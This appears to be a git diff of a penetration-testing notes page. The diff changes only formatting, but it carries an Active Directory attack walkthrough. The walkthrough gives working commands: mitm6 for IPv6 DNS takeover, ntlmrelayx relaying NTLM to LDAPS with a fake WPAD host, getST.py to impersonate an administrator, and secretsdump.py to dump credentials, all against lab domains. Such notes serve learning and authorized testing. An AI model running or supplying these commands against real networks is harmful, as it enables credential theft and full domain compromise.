@@ -10,17 +10,17 @@ For DNS takeover to work, the AD CS role must be installed and configured on the
 
 we run mitm6 on the domain use -i to specify the interface.
 
-```text
+```
 python mitm6.py -i vboxnet0 -d megacorp.local
 ```
 
- leave the terminal open, for now we are playing the role of an IPv6 DNS server in the network.
+&#x20;leave the terminal open, for now we are playing the role of an IPv6 DNS server in the network.
 
 ## LDAP Relay
 
 we use ntlmrelayx.py script from impacket tools to relay the credentials when a client requests for IPv6 resources.
 
-```text
+```
 ntlmrelayx.py -6  -t ldaps://[DC address] -wh fakewpad.megacorp.local -l lootme
 ```
 
@@ -30,9 +30,9 @@ ntlmrelayx.py -6  -t ldaps://[DC address] -wh fakewpad.megacorp.local -l lootme
 
 #### ntlmrelayx.py might not show the success message in the terminal just check the lootme directory.
 
-![](../../../.gitbook/assets/image%20%28210%29.png)
+![](<../../../.gitbook/assets/image (210).png>)
 
-![](../../../.gitbook/assets/image%20%28207%29.png)
+![](<../../../.gitbook/assets/image (207).png>)
 
 #### we can open up the results with firefox
 
@@ -40,7 +40,7 @@ ntlmrelayx.py -6  -t ldaps://[DC address] -wh fakewpad.megacorp.local -l lootme
 
 similarly we can use these commands to target WPAD and grab NTLM hashes:
 
-```text
+```
 # take over DNS with mitm6
 sudo mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqdn
 
@@ -58,8 +58,6 @@ getST.py -spn cifs/icorp-w10.internal.corp internal.corp/RDPOF\$ -impersonate ad
 export KRBCCNAME=admin.ccache
 secretsdump.py -k -no-pass icorp-w10.internal.corp
 ```
-
-
 
 
 
